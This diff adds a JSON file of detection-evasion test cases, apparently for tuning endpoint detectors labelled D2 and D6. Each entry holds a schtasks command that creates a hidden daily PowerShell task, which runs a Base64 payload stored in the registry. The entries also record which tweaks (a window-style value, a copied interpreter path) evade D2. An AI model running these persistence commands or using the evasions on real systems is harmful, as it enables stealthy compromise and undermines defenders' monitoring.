@@ -1,0 +1,32 @@
+[
+  {
+    "transformation": "original (unedited)",
+    "commandline": "\"C:\\windows\\system32\\schtasks.exe\" /Create /F /SC DAILY /ST 09:00 /TN MordorSchtask /TR \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion debug).debug)))\\\"\"",
+    "d2_fires": true,
+    "d6_fires": true
+  },
+  {
+    "transformation": "-W hidden -> -windowstyle hidden (tested: does NOT evade D2)",
+    "commandline": "\"C:\\windows\\system32\\schtasks.exe\" /Create /F /SC DAILY /ST 09:00 /TN MordorSchtask /TR \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -windowstyle hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion debug).debug)))\\\"\"",
+    "d2_fires": true,
+    "d6_fires": true
+  },
+  {
+    "transformation": "interpreter renamed, same directory (tested: does NOT evade D2, path still contains 'powershell')",
+    "commandline": "\"C:\\windows\\system32\\schtasks.exe\" /Create /F /SC DAILY /ST 09:00 /TN MordorSchtask /TR \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\ps.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion debug).debug)))\\\"\"",
+    "d2_fires": true,
+    "d6_fires": true
+  },
+  {
+    "transformation": "-W hidden -> -WindowStyle 1 (tested: evades D2)",
+    "commandline": "\"C:\\windows\\system32\\schtasks.exe\" /Create /F /SC DAILY /ST 09:00 /TN MordorSchtask /TR \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -WindowStyle 1 -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion debug).debug)))\\\"\"",
+    "d2_fires": false,
+    "d6_fires": true
+  },
+  {
+    "transformation": "interpreter copied to C:\\Users\\Public\\svc.exe (tested: evades D2)",
+    "commandline": "\"C:\\windows\\system32\\schtasks.exe\" /Create /F /SC DAILY /ST 09:00 /TN MordorSchtask /TR \"C:\\Users\\Public\\svc.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion debug).debug)))\\\"\"",
+    "d2_fires": false,
+    "d6_fires": true
+  }
+]
